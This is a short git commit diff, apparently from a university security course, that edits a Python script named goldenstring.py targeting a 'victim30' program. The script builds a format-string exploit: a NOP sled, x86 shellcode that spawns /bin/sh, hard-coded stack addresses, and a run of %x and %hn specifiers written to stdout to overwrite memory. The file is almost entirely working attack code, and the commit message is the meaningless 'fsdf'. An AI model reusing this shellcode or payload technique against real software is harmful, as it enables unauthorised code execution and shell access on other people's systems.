acb351426948368087ff615c00e7268411244a3b
Stephen Dean <kdt298@my.utsa.edu>
2022-10-24 16:35:41 -0500

    fsdf

--- victim30/goldenstring.py
+++ victim30/goldenstring.py
@@ -3,8 +3,8 @@ import os
 NOPSLED = b'\x90' * 0x26
 SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
-ADDRESSTOWRITE = b'007FFFFFFFD380'
-i = 1
+
+
 ADDRESSOFSHELL = b'\x00\x00\x7F\xFF\xFF\xFF\xD8\x80'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
@@ -22,6 +22,7 @@ ADDRESSOFSHELL4 = bytes(str(ADDRESSOFSHELL4), 'utf-8')
 #ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[2:], 'big') - ADDRESSOFSHELL1 - 2540
 #ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
 #ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')
+ADDRESSTOWRITE = b'007FFFFFFFD380'
 
 ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
 ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(8, 'little')
@@ -38,7 +39,7 @@ ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(8, 'little'))
 LENTGHOFREQUIRED = 316
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(NOPSLED + SHELLCODE + b'%x'*281 + b'%' + 
+    stdout.write(NOPSLED + SHELLCODE + b'%x.'*281 + b'%' + 
     ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' + b'%hn'+ b'%' + 
     ADDRESSOFSHELL3 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL4 + b'x' + b'%hn' +
     ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + 
